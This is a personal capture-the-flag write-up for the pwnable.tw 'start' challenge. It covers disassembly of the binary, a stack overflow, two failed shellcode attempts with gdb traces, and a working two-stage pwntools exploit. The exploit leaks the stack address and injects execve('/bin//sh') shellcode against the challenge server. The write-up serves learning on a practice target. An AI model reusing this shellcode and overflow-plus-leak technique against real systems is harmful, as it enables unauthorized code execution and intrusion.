# For "start" from pwnable.tw

## Disassembly  
This is the `objdump` of the program. There is no `main()` function, just a `_start()` where the program begins and an `_exit()` where the program ends.
```
Disassembly of section .text:

08048060 <_start>:
 8048060:	54                   	push   esp
 8048061:	68 9d 80 04 08       	push   0x804809d
 8048066:	31 c0                	xor    eax,eax
 8048068:	31 db                	xor    ebx,ebx
 804806a:	31 c9                	xor    ecx,ecx
 804806c:	31 d2                	xor    edx,edx
 804806e:	68 43 54 46 3a       	push   0x3a465443
 8048073:	68 74 68 65 20       	push   0x20656874
 8048078:	68 61 72 74 20       	push   0x20747261
 804807d:	68 73 20 73 74       	push   0x74732073
 8048082:	68 4c 65 74 27       	push   0x2774654c
 8048087:	89 e1                	mov    ecx,esp
 8048089:	b2 14                	mov    dl,0x14
 804808b:	b3 01                	mov    bl,0x1
 804808d:	b0 04                	mov    al,0x4
 804808f:	cd 80                	int    0x80
 8048091:	31 db                	xor    ebx,ebx
 8048093:	b2 3c                	mov    dl,0x3c
 8048095:	b0 03                	mov    al,0x3
 8048097:	cd 80                	int    0x80
 8048099:	83 c4 14             	add    esp,0x14
 804809c:	c3                   	ret    

0804809d <_exit>:
 804809d:	5c                   	pop    esp
 804809e:	31 c0                	xor    eax,eax
 80480a0:	40                   	inc    eax
 80480a1:	cd 80                	int    0x80
```

The code below pushes the string "Let's start the CTF:" into the stack.
The following registers are set to the respective values too
`eax` = 0x4
`ebx` = 0x1
`ecx` = `esp`
`edx` = 0x14
```
    0x0804806e    684354463a   push 0x3a465443 ; 0x3a465443 
    0x08048073    6874686520   push 0x20656874 ; 0x20656874 
    0x08048078    6861727420   push 0x20747261 ; 0x20747261 
    0x0804807d    6873207374   push 0x74732073 ; 0x74732073 
    0x08048082    684c657427   push 0x2774654c ; 0x2774654c 
    0x08048087    89e1         mov ecx, esp
    0x08048089    b214         mov dl, 0x14
    0x0804808b    b301         mov bl, 0x1
    0x0804808d    b004         mov al, 0x4
    0x0804808f    cd80         int 0x80
```
The syscall reference called is `sys_write(int fd, cost char __user *buf, size_t count)` with the following arguments `sys_write(0x1, $esp, 0x14) `, meaning that the string "Let's start the CTF:" is printed into stdout.


## Here comes the interesting part

The following registers are set to the respective values.
`eax`= 0x3
`ebx`= 0x0
`ecx`= `esp`
`edx`= 0x3c
```
    0x08048091    31db         xor ebx, ebx
    0x08048093    b23c         mov dl, 0x3c
    0x08048095    b003         mov al, 0x3
    0x08048097    cd80         int 0x80
       syscall[0xffffffff][0]=? ; sym._end
    0x08048099    83c414       add esp, 0x14
    0x0804809c    c3           ret
```
The syscall reference called is `sys_read(int fd, const char __user *buf, size_t count)` with the following arguments `sys_read(0x0, $ecx, 0x3c)`, meaning that 60 (ie 0x3c) characters are read into the buffer at the stack. (as `$ecx` == `$esp`)

```
    0x08048099    83c414       add esp, 0x14
    0x0804809c    c3           ret
```
The snippet above shows that the return address is only 20 characters (ie 0x14) away from where the user input begins.
This presents a **stack overflow vulnerability**. Unlike the stack exercises in exploit-exercises however, there are no functions present for us to call to get what we want. We have to craft our own exploit.

##### Pseudocode of exploit(first attempt)
>1. Return to the address of the input (hope there is no NX in memory)
>2. Call execve('bash') through system interrupt.
>3. Use bash to show us the flag.

##### Attempt at building exploit(first attempt)

```

mov al, 0x0b
mov ebx, 0x68736162
int 0x80
...		<- 11 random characters to fill the buffer
0xffffcf94	<- The return address in order to execute the inputted shellcode
```

The output below shows that the stack has no `NX` flag set for the stack.
```
(gdb) maintenance info sections
Exec file:
    `/home/solomonbstoner/Desktop/start', file type elf32-i386.
 [0]     0x8048060->0x80480a3 at 0x00000060: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
(gdb) 
```
Ok, so the exploit looks logical. There is no `NX` flag set for the stack, yet the first attempt was a failure. I don't know how or why I got a segfault.
```
(gdb) x/32x $esp
0xffffcf94:	0x4c	0x65	0x74	0x27	0x73	0x20	0x73	0x74
0xffffcf9c:	0x61	0x72	0x74	0x20	0x74	0x68	0x65	0x20
0xffffcfa4:	0x43	0x54	0x46	0x3a	0x9d	0x80	0x04	0x08
0xffffcfac:	0xb0	0xcf	0xff	0xff	0x01	0x00	0x00	0x00
(gdb) ni
0x08048097 in _start ()
=> 0x08048097 <_start+55>:	cd 80	int    0x80
(gdb) ni
0x08048099 in _start ()
=> 0x08048099 <_start+57>:	83 c4 14	add    esp,0x14
(gdb) x/32x $esp
0xffffcf94:	0xb0	0x0b	0xbb	0x62	0x61	0x73	0x68	0xcd
0xffffcf9c:	0x80	0x61	0x61	0x61	0x61	0x61	0x61	0x61
0xffffcfa4:	0x61	0x61	0x61	0x61	0x94	0xcf	0xff	0xff
0xffffcfac:	0x0a	0xcf	0xff	0xff	0x01	0x00	0x00	0x00
(gdb) ni
0x0804809c in _start ()
=> 0x0804809c <_start+60>:	c3	ret    
(gdb) p $esp
$2 = (void *) 0xffffcfa8
(gdb) ni
0xffffcf94 in ?? ()
=> 0xffffcf94:	b0 0b	mov    al,0xb
(gdb) ni
0xffffcf96 in ?? ()
=> 0xffffcf96:	bb 62 61 73 68	mov    ebx,0x68736162
(gdb) ni
0xffffcf9b in ?? ()
=> 0xffffcf9b:	cd 80	int    0x80
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xffffcfa9 in ?? ()
=> 0xffffcfa9:	cf	iret 
(gdb) 
0xffffcfa9 in ?? ()
=> 0xffffcfa9:	cf	iret   
(gdb) info registers
eax            0xffffd08c	-12148
ecx            0xffffdd20	-8928
edx            0xffffdd06	-8954
ebx            0xffffdcf7	-8969
esp            0xffffdd28	0xffffdd28
ebp            0xffffdcbe	0xffffdcbe
esi            0xffffdcad	-9043
edi            0xffffdca0	-9056
eip            0xffffcfa9	0xffffcfa9
eflags         0x246	[ PF ZF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x0	0
(gdb) ni

Program received signal SIGSEGV, Segmentation fault.
0xffffcfa9 in ?? ()
=> 0xffffcfa9:	cf	iret   
(gdb) x/32x $esp
0xffffdd28:	0x4c	0x41	0x4e	0x47	0x55	0x41	0x47	0x45
0xffffdd30:	0x3d	0x65	0x6e	0x5f	0x55	0x53	0x00	0x47
0xffffdd38:	0x4e	0x4f	0x4d	0x45	0x5f	0x44	0x45	0x53
0xffffdd40:	0x4b	0x54	0x4f	0x50	0x5f	0x53	0x45	0x53
(gdb) x/60x 0xffffcf94
0xffffcf94:	0xb0	0x0b	0x31	0xc9	0x31	0xd2	0xbb	0x62
0xffffcf9c:	0x61	0x73	0x68	0xcd	0x80	0x61	0x61	0x61
0xffffcfa4:	0x61	0x61	0x61	0x61	0x94	0xcf	0xff	0xff
0xffffcfac:	0x0a	0xcf	0xff	0xff	0x01	0x00	0x00	0x00
0xffffcfb4:	0xaf	0xd1	0xff	0xff	0x00	0x00	0x00	0x00
0xffffcfbc:	0xd2	0xd1	0xff	0xff	0xe7	0xd1	0xff	0xff
0xffffcfc4:	0xf2	0xd1	0xff	0xff	0x04	0xd2	0xff	0xff
0xffffcfcc:	0x1b	0xd2	0xff	0xff
(gdb) x/x 0x474e414c
0x474e414c:	Cannot access memory at address 0x474e414c
(gdb) 
```

I though perhaps `execve()` wants the the address of the word *"bash"* instead of the word itself, so I changed `ebx` to point towards the part of the stack that the word *"bash"* would be. 

##### Second attempt:

```
mov al, 0x0b
xor ecx, ecx
xor edx, edx
mov ebx, 0xffffcfac <- address of "bash"
int 0x80
...
0xffffcf94
0x68736162

Hex values are:
\xB0\x0B\x31\xC9\x31\xD2\xBB\xAC\xCF\xFF\xFF\xCD\x80\x61\x61\x61\x61\x61\x61\x61\x94\xcf\xff\xff\x68\x73\x61\x62
```

Unfortunately, the 2nd attempt still did not work. I do not know why, but I still got a segfault.
```
(gdb) run < exploit for start 
The program being debugged has been started already.
Start it from the beginning? (y or n) n
Program not restarted.
(gdb) run < exploit\ for\ start 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/solomonbstoner/Desktop/start < exploit\ for\ start

Breakpoint 1, 0x08048060 in _start ()
=> 0x08048060 <_start+0>:	54	push   esp
(gdb) c
Continuing.
Let's start the CTF:
Breakpoint 3, 0x08048095 in _start ()
=> 0x08048095 <_start+53>:	b0 03	mov    al,0x3
(gdb) ni
0x08048097 in _start ()
=> 0x08048097 <_start+55>:	cd 80	int    0x80
(gdb) 
0x08048099 in _start ()
=> 0x08048099 <_start+57>:	83 c4 14	add    esp,0x14
(gdb) 
0x0804809c in _start ()
=> 0x0804809c <_start+60>:	c3	ret    
(gdb) 
0xffffcf94 in ?? ()
=> 0xffffcf94:	b0 0b	mov    al,0xb
(gdb) 
0xffffcf96 in ?? ()
=> 0xffffcf96:	31 c9	xor    ecx,ecx
(gdb) 
0xffffcf98 in ?? ()
=> 0xffffcf98:	31 d2	xor    edx,edx
(gdb) 
0xffffcf9a in ?? ()
=> 0xffffcf9a:	bb ac cf ff ff	mov    ebx,0xffffcfac
(gdb) x/s 0xffffcfac
0xffffcfac:	"hsab\n"
(gdb) ni
0xffffcf9f in ?? ()
=> 0xffffcf9f:	cd 80	int    0x80
(gdb) 

(other irrelevant information)

=> 0xffffcfa8:	94	xchg   esp,eax
(gdb) 
0xffffcfa9 in ?? ()
=> 0xffffcfa9:	cf	iret   
(gdb) 

Program received signal SIGSEGV, Segmentation fault.
0xffffcfa9 in ?? ()
=> 0xffffcfa9:	cf	iret   
(gdb) 

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) 
```


## Analysis of failures

This is the format of my shellcode:
```
<<shellcode>> AAAA <<return address>> <<"bash">>
```
The return address and string *"bash"* are **mistaken as computer instructions**. For example, `\x61` is the character of *'a'*, but it was interpreted to be `popa`. The return-address portion of the shellcode was seen as `iret`, causing the seg fault as the program tries to return inaccessible memory.

I tried adding `ret` at the end of the shellcode to fix that problem, but it did not work. Ok that means something is really wrong. If a `ret` does not return, but instead continues execution in the shellcode, it must mean that *maybe* the shellcode is not being run at all. I am aware that even if ASLR is enabled in the program, `gdb` does not reflect the changing stack and heap addresses (possibly to make it easy to debug). 

Since my shellcode explicitly states a return address, that means the return address *did not* return to the front of the shellcode like intended, but ended in some other place (ie undefined behaviour). Definitely a sign of ASLR, but I don't know how to deal with that, at least not at the time of doing this challenge. So, I have to consult a write up.

## The writeup
According to [this writeup](https://medium.com/@__cpg/pwnable-tw-start-100pt-b98f55bf8d6), 
ASLR is enabled in this application. This means that the stack's address in each run is always different, and hence the return address I override does not always point back to my shellcode.
So, this writeup used a *2-stage exploit*. The first stage prints the address of the stack, and the second will launch the actual exploit.

The author noticed, 
>"Turning point was noticing there was no reason for the binary to push esp at the entry point. It was a great hint. You can make the binary leak the stack address via making it leak that esp: you want to print stored esp, jump again into the main function, perform the exploit now knowing more about the stack position."

## The exploit script
```
from pwn import *
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload="A"*20+p32(0x08048087) # 0x08048087 mov %esp,%ecx
 
p = remote("chall.pwnable.tw",10000) #To open connection 
 
print p.recvuntil(":") #Reads till : 
 
p.send(payload)
message=p.recv(20)[0:4]#address is string
stack=u32(message) 

print "Address of stack: " + hex(stack)

payload_next="A"*20+p32(stack+0x14)+shellcode

p.sendline(payload_next) 
 
p.interactive()
```


The shellcode is disassembled to be:
```
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f	;pushes "/bin//sh" into the stack
d:  89 e3                   mov    ebx,esp
f:  89 c1                   mov    ecx,eax
11: 89 c2                   mov    edx,eax
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80		;execve("/bin//sh")
17: 31 c0                   xor    eax,eax
19: 40                      inc    eax
1a: cd 80                   int    0x80		;sys_exit
```
Honestly it is very similar to what I had in mind. *I just failed to consider that ASLR was enabled.*

I played around with the code and noticed the following things:
1. Changing *"/bin//sh"* to *"bash"* does not work. I do not know why either. (But *"/bin/sh"* works fine)
2. *"\x31\xc0\x40\xcd\x80"* is completely redundant. We do not need to do a sys_exit afterwards.

I did not manage to solve this problem without first consulting a writeup because I failed to consider the possibility of ASLR being enabled, and I failed to see how I could make use of `sys_write()` and `push esp` to print the address of the stack everytime. But at least I learned that actually, I can. :)

END
